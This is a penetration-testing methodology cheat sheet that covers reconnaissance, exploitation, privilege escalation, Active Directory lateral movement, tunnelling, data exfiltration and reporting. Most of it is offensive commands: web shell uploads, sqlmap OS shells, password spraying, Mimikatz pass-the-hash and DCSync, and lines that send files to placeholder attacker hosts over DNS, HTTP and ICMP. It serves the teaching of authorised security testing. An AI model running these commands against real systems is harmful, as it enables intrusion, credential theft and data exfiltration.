# Pentest Methodology Phases

## Overview

A structured penetration test follows a proven methodology to ensure comprehensive coverage, repeatability, and defensible findings. This reference covers the seven phases of penetration testing based on PTES (Penetration Testing Execution Standard) and OWASP testing guides.

## Phase 1: Reconnaissance

### Passive Reconnaissance (OSINT)
**Techniques and Tools:**
```bash
# DNS enumeration
dig any example.com
nslookup -type=any example.com
dnsrecon -d example.com -t std
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dns/subdomains.txt

# Subdomain discovery
sublist3r -d example.com -o subdomains.txt
amass enum -d example.com -o amass_output.txt
subfinder -d example.com -o subfinder_output.txt

# Email/employee enumeration
theHarvester -d example.com -b google,linkedin,bing -l 500

# Technology fingerprinting
whatweb example.com
wappalyzer-cli https://example.com
builtwith https://example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Shodan/Censys search
shodan search ssl.cert.subject.CN:example.com
shodan search org:"Example Corp" port:443

# Wayback machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com&output=json&fl=original&limit=1000"
```

**Output:**
- Domain names, subdomains, IP ranges
- Employee names and email addresses
- Technology stack (web servers, frameworks, DBs)
- Third-party services (CDN, email, analytics)
- Remote access endpoints (VPN, RDP, Citrix)

### Active Reconnaissance
```bash
# Port scanning
nmap -sS -sV -O -T4 -p- --min-rate=10000 -oA full_scan 10.0.0.0/24
nmap -sS -sV -A --script=http-enum,http-headers,ssl-enum-ciphers -p 80,443 10.0.0.1

# Service enumeration
nmap -sU -sV --top-ports=100 10.0.0.1          # UDP scan
nmap -p- --script=smb-os-discovery 10.0.0.1     # SMB enumeration
nmap -p 161 --script=snmp-info 10.0.0.1          # SNMP enumeration

# Web crawling
gospider -s https://example.com -c 50 -t 3 -o crawl_output
katana -u https://example.com -d 3 -o katana_urls.txt
hakrawler -url https://example.com -depth 3 -plain
```

## Phase 2: Scanning and Enumeration

### Vulnerability Scanning
```bash
# Nessus scanning
nessuscli scan new --name "External Pentest" --policy "Web App Tests" --target "10.0.0.0/24"

# OpenVAS
gvm-cli --gmp-username admin --gmp-password pass socket --xml "<start_task task_id='task-uuid'/>"

# Nuclei scanning
nuclei -u https://example.com -t cves/ -t exposures/ -severity critical,high -o nuclei_results.txt

# Nmap NSE scripts
nmap -sV --script=vuln 10.0.0.1
nmap -p 443 --script=ssl-heartbleed 10.0.0.1
```

### Web Application Enumeration
```bash
# Directory/file brute-forcing
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403,404
dirsearch -u https://example.com -e php,asp,aspx,jsp,html -x 403,404

# Parameter discovery
ffuf -u "https://example.com/api/v1/users?FUZZ=1" -w params.txt -fs 0
arjun -u https://example.com/api/v1/users

# Technology detection
wappalyzer -u https://example.com
whatweb -a 3 https://example.com

# Endpoint discovery
kiterunner -u https://example.com -w api-endpoints.txt
linkfinder -i https://example.com -d 3
```

## Phase 3: Exploitation

### Initial Access Vectors
```bash
# Web exploitation
sqlmap -u "https://example.com/page?id=1" --batch --risk=3 --level=5
sqlmap -r request.txt --batch --os-shell

# XSS exploitation
xsstrike -u "https://example.com/search?q=test"
dalfox url https://example.com/search?q=test -b hunter.xss.ht

# SSRF testing
ffuf -u "https://example.com/fetch?url=FUZZ" -w ssrf_payloads.txt -fw 0
gophergen -u "https://example.com/fetch?url=http://169.254.169.254/"

# File upload exploitation
# 1. Upload web shell
curl -X POST -F "file=@shell.php" -F "filename=shell.php" https://example.com/upload

# 2. Try path traversal in upload
curl -X POST -F "file=@shell.php" -F "filename=../../../var/www/html/shell.php" https://example.com/upload

# Network exploitation
msfconsole -q -x "use exploit/multi/http/struts2_content_type; set RHOSTS 10.0.0.1; run"
```

### Credential Attacks
```bash
# Password spraying
kerbrute passwordspray -d corp.local users.txt "Password123!" --dc 10.0.0.1
crackmapexec smb 10.0.0.0/24 -u users.txt -p "Winter2026!" --continue-on-success

# Hash cracking
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 -a 0 kerberos_tgs.txt /usr/share/wordlists/rockyou.txt --force

# Password spraying (web)
hydra -L users.txt -P passwords.txt https-post-form://target.com/login:username=^USER^&password=^PASS^:F=Invalid
```

## Phase 4: Privilege Escalation

### Linux Privilege Escalation
```bash
# Automated enumeration
linpeas.sh | tee linpeas_output.txt
./linenum.sh
unix-privesc-check standard

# SUID binaries
find / -perm -4000 -type f 2>/dev/null | xargs -I {} ls -la {}
find / -perm -2000 -type f 2>/dev/null

# Sudo rights
sudo -l

# Kernel exploits
linux-exploit-suggester.sh
searchsploit "linux kernel $(uname -r) privilege escalation"

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Docker/LXC breakout
find / -name "docker.sock" 2>/dev/null
capsh --print
```

### Windows Privilege Escalation
```powershell
# Automated enumeration
winPEAS.exe quiet cmd windows
PowerUp.ps1
Sherlock.ps1

# Service misconfigurations
Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}
icacls C:\Program Files\VulnerableService\service.exe

# Unquoted service paths
Get-CimInstance -ClassName Win32_Service | ForEach-Object {
    if ($_.PathName -match '^[^"]') { Write-Host $_.Name $_.PathName }
}

# AlwaysInstallElevated
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated

# Token manipulation
Incognito.exe list_tokens -u
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

## Phase 5: Lateral Movement

### Active Directory Lateral Movement
```powershell
# Pass-the-Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:powershell.exe"'

# Overpass-the-Hash
Rubeus.exe asktgt /user:admin /rc4:HASH /domain:corp /ptt

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
Invoke-Kerberoast -OutputFormat HashCat | Export-Csv kerberoast.csv

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Get-ASREPHash -Username victimuser

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp /user:krbtgt"'

# PsExec lateral movement
psexec \\target -u corp\admin -p password cmd.exe
wmiexec.py corp/admin@target cmd.exe
atexec.py corp/admin@target cmd.exe
```

### SSH Tunneling and Pivoting
```bash
# Local port forwarding
ssh -L 8080:internal-web:80 user@jumphost

# Remote port forwarding
ssh -R 8080:localhost:80 user@attacker-server

# Dynamic SOCKS proxy
ssh -D 9050 user@jumphost
# Then use proxychains: proxychains nmap -sT -sV internal-server

# SSH through multiple hops
ssh -J user@jump1,user@jump2 user@target

# Chisel tunnel
./chisel server -p 8000 --reverse  # On attacker machine
./chisel client attacker:8000 R:8080:localhost:80  # On compromised host

# FRP tunnel
# frps.ini (attacker)
[common]
bind_port = 7000
# frpc.ini (compromised host)
[common]
server_addr = attacker_ip
server_port = 7000
[web]
type = tcp
local_ip = 127.0.0.1
local_port = 80
remote_port = 8080
```

## Phase 6: Data Exfiltration

### Exfiltration Techniques
```bash
# DNS exfiltration
cat data.txt | base64 | while read line; do dig +short $line.exfil.attacker.com; done

# HTTP exfiltration
curl -X POST -d @sensitive_data.txt https://attacker.com/exfil

# ICMP exfiltration
ping -c 1 -p $(cat data.txt | base64) attacker.com

# Encrypted tunnel
socat TCP-LISTEN:4444,fork OPENSSL:attacker.com:443

# Steganography
steghide embed -cf image.jpg -ef secret.txt -p password
```

## Phase 7: Reporting and Remediation

### Report Generation
```bash
# Generate report from scan results
faraday --report --workspace pentest --format pdf
sirius --load findings.json --template executive --output report.pdf

# CVSS scoring
cvss-calculator --vector "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" --version 3.1

# Evidence collection
# Organize screenshots, POC scripts, and logs
mkdir -p evidence/{web,network,cloud,screenshots,logs}
```

### Retesting Process
1. Receive remediated findings from client
2. Verify each fix with targeted testing
3. Document retest results (Fixed / Partially Fixed / Not Fixed)
4. Update CVSS scores for remaining findings
5. Provide final retest report summary
